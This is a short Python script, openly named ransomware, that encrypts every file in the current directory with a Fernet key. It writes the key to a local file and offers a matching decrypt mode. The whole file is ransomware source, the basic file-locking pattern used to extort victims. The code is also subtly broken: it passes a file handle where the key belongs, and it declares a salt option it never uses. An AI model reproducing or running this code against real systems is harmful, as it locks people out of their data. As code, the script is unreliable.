import os
from cryptography.fernet import Fernet

def encrypt():
    files = []
    for file in os.listdir():
        if file == "ransomware.py" or file == "thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)

    genkey = Fernet.generate_key()

    with open("thekey.key","wb") as key:
        key.write(genkey)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(encrypted_contents)

def decrypt():
    files = []
    for file in os.listdir():
        if file == "ransomware.py" or file == "thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)

    print(files)

    with open("thekey.key","rb") as key:
        secretkey = key.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        decrypted_contents = Fernet(secretkey).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(decrypted_contents)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Ransomware")
    parser.add_argument("-s", "--salt-size", help="If this is set, a new salt with the passed size is generated",
                        type=int)
    parser.add_argument("-e", "--encrypt", action="store_true",
                        help="To encrypt all files in directory")
    parser.add_argument("-d", "--decrypt", action="store_true",
                        help="To decrypt all files in directory")

    args = parser.parse_args()

    encrypt_ = args.encrypt
    decrypt_ = args.decrypt

    if encrypt_ and decrypt_:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")
    elif encrypt_:
        encrypt()
    elif decrypt_:
        decrypt()
    else:
        raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")